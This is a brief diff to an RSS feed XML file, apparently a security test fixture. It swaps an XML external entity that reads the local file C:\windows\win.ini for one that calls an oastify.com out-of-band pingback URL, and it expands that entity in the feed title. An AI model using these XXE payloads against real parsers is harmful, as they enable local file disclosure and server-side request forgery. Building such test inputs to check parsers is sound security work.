@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<![CDATA[<!DOCTYPE doc [<!ENTITY test SYSTEM "file:///C:\windows\win.ini">]>]]>
+<!DOCTYPE doc [<!ENTITY test SYSTEM "http://01ze460qi64zse0wpn6yr7l7zy5vtk.oastify.com/pingback">]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title><![CDATA[&test;]]></title>
+    <title>&test;></title>
     <link>http://example.com/</link>
     <description>A blog about things</description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
